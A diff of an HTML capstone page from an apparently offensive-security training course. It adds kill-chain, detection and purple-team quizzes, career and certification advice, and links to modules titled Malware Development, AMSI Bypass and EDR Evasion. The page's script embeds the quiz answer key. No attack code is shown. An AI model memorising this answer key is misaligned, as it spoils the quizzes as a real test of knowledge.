             <ul style="margin-left: 1.5rem; line-height: 2;">
                 <li><strong>WEB01</strong> (192.168.100.10) — Web server, standard user access</li>
@@ -242,7 +935,7 @@
 
         <div class="exam-section">
             <h3>🏆 Scoring</h3>
-            <table style="width: 100%; border-collapse: collapse; margin-top: 1rem;">
+            <table>
                 <tr style="border-bottom: 1px solid var(--border);">
                     <td style="padding: 0.5rem;">90-100 points</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">PASS with Distinction</td>
@@ -258,7 +951,182 @@
             </table>
         </div>
 
-        <h2>Preparation Checklist</h2>
+        <h2>🧠 Interactive Quizzes</h2>
+        <p>Test your readiness before attempting the capstone. Each quiz covers critical concepts from the full course.</p>
+
+        <div class="quiz-container" id="quiz1">
+            <h3>Quiz 1: Kill Chain Fundamentals</h3>
+            <p><strong>Question:</strong> During the GeoDefend engagement, you discover that WEB01 is running an outdated version of Apache Struts. Which kill chain phase are you currently in, and what is the most appropriate next action?</p>
+            <div class="quiz-option" onclick="checkAnswer(this, 'A', 1)">
+                A) Weaponization — build a Struts exploit payload and deliver it immediately
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, 'B', 1)">
+                B) Reconnaissance — continue mapping the environment before selecting an exploit
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, 'C', 1)">
+                C) Exploitation — attempt the Struts vulnerability directly without further recon
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, 'D', 1)">
+                D) Installation — establish persistence on WEB01 first, then exploit
+            </div>
+            <div class="quiz-feedback" id="feedback1"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz2">
+            <h3>Quiz 2: Blue Team Detection</h3>
+            <p><strong>Question:</strong> Your EDR alerts on LSASS memory access by a process named <code>rundll32.exe</code> with command line <code>rundll32.exe C:\Users\jdoe\AppData\Local\Temp\update.dll, DllRegisterServer</code>. Which detection strategy would most reliably identify this as malicious?</p>
+            <div class="quiz-option" onclick="checkAnswer(this, 'A', 2)">
+                A) Block all rundll32.exe execution — it is never legitimately used
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, 'B', 2)">
+                B) Alert on rundll32.exe loading DLLs from user-writable directories
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, 'C', 2)">
+                C) Alert only if the DLL is not signed by Microsoft
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, 'D', 2)">
+                D) This is normal Windows behavior — no action needed
+            </div>
+            <div class="quiz-feedback" id="feedback2"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz3">
+            <h3>Quiz 3: Purple Team Integration</h3>
+            <p><strong>Question:</strong> After a red team engagement, you discover that 60% of techniques used were not detected by the blue team. What is the most appropriate purple team response?</p>
+            <div class="quiz-option" onclick="checkAnswer(this, 'A', 3)">
+                A) Blame the blue team for poor detection and demand immediate improvement
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, 'B', 3)">
+                B) Prioritize the undetected techniques by impact and likelihood, then build detections iteratively
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, 'C', 3)">
+                C) Accept that some techniques are undetectable and focus on prevention instead
+            </div>
+            <div class="quiz-option" onclick="checkAnswer(this, 'D', 3)">
+                D) Increase the red team budget so they can find even more gaps
+            </div>
+            <div class="quiz-feedback" id="feedback3"></div>
+        </div>
+
+        <h2>🎓 Career Paths</h2>
+        <p>Completing the 22nd Survey Division course opens multiple career trajectories. The capstone is your proof of competence for employers.</p>
+
+        <div class="career-path">
+            <div class="career-step">
+                <h5>Junior Operator</h5>
+                <p>0-2 years</p>
+                <p style="font-size: 0.85rem; color: var(--dim);">Penetration tester, SOC analyst, vulnerability researcher</p>
+            </div>
+            <div class="career-arrow">→</div>
+            <div class="career-step">
+                <h5>Senior Operator</h5>
+                <p>3-5 years</p>
+                <p style="font-size: 0.85rem; color: var(--dim);">Red team lead, threat hunter, malware analyst</p>
+            </div>
+            <div class="career-arrow">→</div>
+            <div class="career-step">
+                <h5>Principal / Staff</h5>
+                <p>5-8 years</p>
+                <p style="font-size: 0.85rem; color: var(--dim);">Offensive security architect, detection engineer, research director</p>
+            </div>
+            <div class="career-arrow">→</div>
+            <div class="career-step">
+                <h5>Executive / Founder</h5>
+                <p>8+ years</p>
+                <p style="font-size: 0.85rem; color: var(--dim);">CISO, consulting partner, product founder, government advisor</p>
+            </div>
+        </div>
+
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4>Offensive Security</h4>
+                <p>Penetration testing, red teaming, exploit development, malware research. High demand, high stress, high reward.</p>
+            </div>
+            <div class="method-card">
+                <h4>Defensive Security</h4>
+                <p>Blue team operations, detection engineering, incident response, SOC leadership. Stable, structured, critical.</p>
+            </div>
+            <div class="method-card">
+                <h4>Purple Team / Research</h4>
+                <p>Adversary emulation, threat intelligence, detection research, tool development. The bridge between offense and defense.</p>
+            </div>
+            <div class="method-card">
+                <h4>Government / Intelligence</h4>
+                <p>National security, cyber operations, counter-intelligence, policy. Requires clearance, offers unique mission impact.</p>
+            </div>
+            <div class="method-card">
+                <h4>Consulting / Leadership</h4>
+                <p>Security architecture, risk management, CISO advisory, board engagement. Business acumen meets technical depth.</p>
+            </div>
+            <div class="method-card">
+                <h4>Product Security</h4>
+                <p>AppSec, DevSecOps, cloud security engineering, product management. Build secure systems at scale.</p>
+            </div>
+        </div>
+
+        <h2>🏅 Certification Recommendations</h2>
+        <p>The 22nd Survey Division certification is a foundation, not a destination. These industry certifications validate your expertise at different career stages.</p>
+
+        <div class="cert-grid">
+            <div class="cert-card">
+                <h4>OSCP (Offensive Security Certified Professional)</h4>
+                <p>The gold standard for penetration testers. 24-hour practical exam, requires deep Linux and Windows exploitation knowledge.</p>
+                <span class="cert-tag tag-red">Red Team</span>
+                <span class="cert-tag tag-green">Entry-Mid</span>
+                <span class="cert-tag tag-blue">$1,600+</span>
+            </div>
+            <div class="cert-card">
+                <h4>OSCE3 (Offensive Security Certified Expert)</h4>
+                <p>Advanced exploit development, web application attacks, and EDR evasion. Three 48-hour exams. The pinnacle of offensive certifications.</p>
+                <span class="cert-tag tag-red">Red Team</span>
+                <span class="cert-tag tag-green">Senior</span>
+                <span class="cert-tag tag-blue">$2,500+</span>
+            </div>
+            <div class="cert-card">
+                <h4>GCIH (GIAC Certified Incident Handler)</h4>
+                <p>Incident response, detection, and containment. Open-book exam with practical scenarios. Ideal for blue team professionals.</p>
+                <span class="cert-tag tag-blue">Blue Team</span>
+                <span class="cert-tag tag-green">Entry-Mid</span>
+                <span class="cert-tag tag-blue">$2,000+</span>
+            </div>
+            <div class="cert-card">
+                <h4>GREM (GIAC Reverse Engineering Malware)</h4>
+                <p>Static and dynamic malware analysis, reverse engineering, and threat intelligence. Essential for malware researchers.</p>
+                <span class="cert-tag tag-purple">Purple Team</span>
+                <span class="cert-tag tag-green">Mid-Senior</span>
+                <span class="cert-tag tag-blue">$2,000+</span>
+            </div>
+            <div class="cert-card">
+                <h4>CISSP (Certified Information Systems Security Professional)</h4>
+                <p>Management-focused, broad security domains. Required for many government and enterprise security leadership roles.</p>
+                <span class="cert-tag tag-blue">Management</span>
+                <span class="cert-tag tag-green">Mid-Senior</span>
+                <span class="cert-tag tag-blue">$750+</span>
+            </div>
+            <div class="cert-card">
+                <h4>CRTO (Certified Red Team Operator)</h4>
+                <p>Cobalt Strike-focused red team operations. 48-hour practical exam emphasizing C2, persistence, and evasion.</p>
+                <span class="cert-tag tag-red">Red Team</span>
+                <span class="cert-tag tag-green">Mid</span>
+                <span class="cert-tag tag-blue">$1,200+</span>
+            </div>
+            <div class="cert-card">
+                <h4>BTL1 (Blue Team Level 1)</h4>
+                <p>Practical blue team certification with 24-hour incident response exam. SIEM analysis, threat hunting, and forensics.</p>
+                <span class="cert-tag tag-blue">Blue Team</span>
+                <span class="cert-tag tag-green">Entry</span>
+                <span class="cert-tag tag-blue">$500+</span>
+            </div>
+            <div class="cert-card">
+                <h4>eCPPT (eLearnSecurity Certified Professional Penetration Tester)</h4>
+                <p>Practical penetration testing with report writing emphasis. Good bridge between training and OSCP.</p>
+                <span class="cert-tag tag-red">Red Team</span>
+                <span class="cert-tag tag-green">Entry</span>
+                <span class="cert-tag tag-blue">$400+</span>
+            </div>
+        </div>
+
+        <h2>📝 Preparation Checklist</h2>
 
         <div class="step-box">
             <h4>Before the Exam</h4>
@@ -283,6 +1151,69 @@
             </ul>
         </div>
 
+        <h2>🎓 Lessons Learned</h2>
+        <p>Every capstone attempt teaches something. Here are the most common lessons from past candidates:</p>
+
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4>Time Management</h4>
+                <p>Spend the first 30 minutes on reconnaissance, not exploitation. A well-targeted attack saves hours of brute force.</p>
+            </div>
+            <div class="method-card">
+                <h4>Documentation Discipline</h4>
+                <p>Screenshot every step as you go. Retroactive documentation is inaccurate and costs points.</p>
+            </div>
+            <div class="method-card">
+                <h4>Tool Reliability</h4>
+                <p>Test your tools in a lab before the exam. A broken payload at hour 6 is a failed exam.</p>
+            </div>
+            <div class="method-card">
+                <h4>Privilege Escalation Patience</h4>
+                <p>Don't chase impossible escalation paths. If one technique fails, move to another — there are always multiple paths.</p>
+            </div>
+            <div class="method-card">
+                <h4>Clean Exfiltration</h4>
+                <p>Don't celebrate early. A compromised DC means nothing if you can't exfiltrate the flag cleanly.</p>
+            </div>
+            <div class="method-card">
+                <h4>Remediation Matters</h4>
+                <p>The best operators find vulnerabilities and fix them. Remediation recommendations are 20% of your score.</p>
+            </div>
+        </div>
+
+        <h2>🔗 Cross-Reference to All Modules</h2>
+        <p>The capstone integrates knowledge from every module in the course. Use this index to review weak areas before attempting the exam.</p>
+
+        <div class="module-index">
+            <a href="MODULE_00_READER.html" class="module-link">Module 00 <span>— Course Reader</span></a>
+            <a href="MODULE_01.html" class="module-link">Module 01 <span>— Introduction</span></a>
+            <a href="MODULE_01_NETWORKING.html" class="module-link">Module 01 <span>— Networking</span></a>
+            <a href="MODULE_02_RECON.html" class="module-link">Module 02 <span>— Reconnaissance</span></a>
+            <a href="MODULE_03_POWERSHELL.html" class="module-link">Module 03 <span>— PowerShell</span></a>
+            <a href="MODULE_04_CODING_BASICS.html" class="module-link">Module 04 <span>— Coding Basics</span></a>
+            <a href="MODULE_05_SHELLCODE.html" class="module-link">Module 05 <span>— Shellcode</span></a>
+            <a href="MODULE_06_MEMORY.html" class="module-link">Module 06 <span>— Memory Forensics</span></a>
+            <a href="MODULE_07_REGISTRY.html" class="module-link">Module 07 <span>— Registry</span></a>
+            <a href="MODULE_08_PRIVESC.html" class="module-link">Module 08 <span>— Privilege Escalation</span></a>
+            <a href="MODULE_09_MALWARE.html" class="module-link">Module 09 <span>— Malware Development</span></a>
+            <a href="MODULE_10_CODE_INJECTION.html" class="module-link">Module 10 <span>— Code Injection</span></a>
+            <a href="MODULE_11_ROOTKITS.html" class="module-link">Module 11 <span>— Rootkits</span></a>
+            <a href="MODULE_11_AMSI.html" class="module-link">Module 11 <span>— AMSI Bypass</span></a>
+            <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="module-link">Module 12 <span>— Defensive Verification</span></a>
+            <a href="MODULE_12_ETW_BYPASS.html" class="module-link">Module 12 <span>— ETW Bypass</span></a>
+            <a href="MODULE_13_EDR_EVASION.html" class="module-link">Module 13 <span>— EDR Evasion</span></a>
+            <a href="MODULE_13_KAV_EVASION.html" class="module-link">Module 13 <span>— KAV Evasion</span></a>
+            <a href="MODULE_14_CLOUD_FILES.html" class="module-link">Module 14 <span>— Cloud Files</span></a>
+            <a href="MODULE_15_LATERAL.html" class="module-link">Module 15 <span>— Lateral Movement</span></a>
+            <a href="MODULE_16_C2.html" class="module-link">Module 16 <span>— C2 Infrastructure</span></a>
+            <a href="MODULE_17_SOCIAL_ENGINEERING.html" class="module-link">Module 17 <span>— Social Engineering</span></a>
+            <a href="MODULE_18_ANDROID.html" class="module-link">Module 18 <span>— Android Exploitation</span></a>
+            <a href="MODULE_19_AD.html" class="module-link">Module 19 <span>— Active Directory</span></a>
+            <a href="MODULE_20_KILL_CHAIN.html" class="module-link">Module 20 <span>— Kill Chain</span></a>
+            <a href="MODULE_21_MOBILE.html" class="module-link">Module 21 <span>— Mobile Capstone</span></a>
+            <a href="MODULE_21_CAPSTONE.html" class="module-link">Module 21 <span>— Capstone (this module)</span></a>
+        </div>
+
         <h2>Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
@@ -291,11 +1222,14 @@
             <li><strong>Documentation matters:</strong> A successful exploit with no documentation = 0 points</li>
             <li><strong>Remediation is professional:</strong> Finding bugs is easy; fixing them is the value</li>
             <li><strong>Failure is data:</strong> If you fail, you know exactly what to study. Retake is free.</li>
+            <li><strong>Purple team mindset:</strong> The best security professionals understand both offense and defense</li>
+            <li><strong>Continuous learning:</strong> Certifications are checkpoints, not destinations</li>
+            <li><strong>Ethics are non-negotiable:</strong> Authorized testing only. Unauthorized access is a crime.</li>
         </ul>
 
         <div class="evidence-box" style="margin-top: 2rem;">
             <h3>🔬 Verification Status</h3>
-            <table style="width: 100%; border-collapse: collapse;">
+            <table>
                 <tr style="border-bottom: 1px solid var(--border);">
                     <td style="padding: 0.5rem;">Exam environment</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ 3-machine lab ready</td>
@@ -308,17 +1242,74 @@
                     <td style="padding: 0.5rem;">Time limit</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ 8 hours enforced</td>
                 </tr>
-                <tr>
+                <tr style="border-bottom: 1px solid var(--border);">
                     <td style="padding: 0.5rem;">Pass criteria</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ 70+ points required</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Kill chain coverage</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ All 7 phases mapped</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Cross-module links</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ All 22 modules linked</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Interactive quizzes</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ 3 quizzes embedded</td>
+                </tr>
+                <tr>
+                    <td style="padding: 0.5rem;">Copy buttons</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ All code blocks enabled</td>
                 </tr>
             </table>
         </div>
 
         <div class="nav" style="margin-top: 2rem;">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_20_KILL_CHAIN.html">← Module 20</a>
+            <a href="MODULE_21_MOBILE.html">Module 21 (Mobile) →</a>
         </div>
     </div>
+
+    <script>
+        function copyCode(btn) {
+            const block = btn.parentElement;
+            const code = block.innerText.replace('COPY', '').trim();
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'COPIED!';
+                setTimeout(() => btn.textContent = 'COPY', 2000);
+            });
+        }
+
+        const quizAnswers = {
+            1: { correct: 'B', explanation: 'Identifying an outdated Apache Struts version is reconnaissance. The correct action is to continue mapping before selecting an exploit. Weaponizing immediately (A) skips critical planning. Exploiting without further recon (C) is reckless. Installation (D) is impossible without access first.' },
+            2: { correct: 'B', explanation: 'Rundll32.exe is a legitimate Windows binary often abused via LOLBAS techniques. Blocking all rundll32.exe (A) breaks legitimate software. Checking signatures only (C) misses signed but malicious DLLs. Ignoring it (D) guarantees compromise.' },
+            3: { correct: 'B', explanation: 'Purple teaming is collaborative, not adversarial. Prioritizing by impact (B) focuses limited resources effectively. Blaming (A) destroys trust. Accepting undetectability (C) is defeatist. Increasing red budget (D) without fixing gaps is wasteful.' }
+        };
+
+        function checkAnswer(element, choice, quizNum) {
+            const container = document.getElementById('quiz' + quizNum);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById('feedback' + quizNum);
+            const answer = quizAnswers[quizNum];
+
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt === element) {
+                    if (choice === answer.correct) {
+                        opt.classList.add('correct');
+                    } else {
+                        opt.classList.add('wrong');
+                    }
+                } else if (opt.innerText.trim().startsWith(answer.correct + ')')) {
+                    opt.classList.add('correct');
+                }
+            });
+
+            feedback.innerHTML = '<strong>' + (choice === answer.correct ? '✅ Correct!' : '❌ Incorrect.') + '</strong> ' + answer.explanation;
+            feedback.className = 'quiz-feedback show ' + (choice === answer.correct ? 'correct' : 'wrong');
+        }
+    </script>
 </body>
 </html>
